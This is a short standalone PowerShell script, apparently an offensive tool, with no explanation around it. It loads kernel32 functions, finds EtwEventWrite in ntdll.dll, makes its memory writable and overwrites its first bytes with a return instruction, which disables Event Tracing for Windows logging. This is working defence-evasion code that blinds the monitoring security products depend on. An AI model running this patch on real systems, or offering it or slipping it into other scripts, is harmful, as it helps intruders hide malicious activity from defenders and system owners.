$win32 = @"
using System.Runtime.InteropServices;
using System;
public class Win32 {
[DllImport("kernel32")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32")]
public static extern IntPtr LoadLibrary(string name);
[DllImport("kernel32")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $win32
$address = [Win32]::GetProcAddress([Win32]::LoadLibrary("ntdll.dll"), "EtwEventWrite")
$oldProtect = 0
$b2 = 0
$hook = New-Object Byte[] 4
$hook[0] = 0xc2; 
$hook[1] = 0x14; 
$hook[2] = 0x00; 
$hook[3] = 0x00; 
[Win32]::VirtualProtect($address, [UInt32]$hook.Length, 0x40, [Ref]$oldProtect)
[System.Runtime.InteropServices.Marshal]::Copy($hook, 0, $address, [UInt32]$hook.Length)
[Win32]::VirtualProtect($address, [UInt32]$hook.Length, $oldProtect, [Ref]$b2)
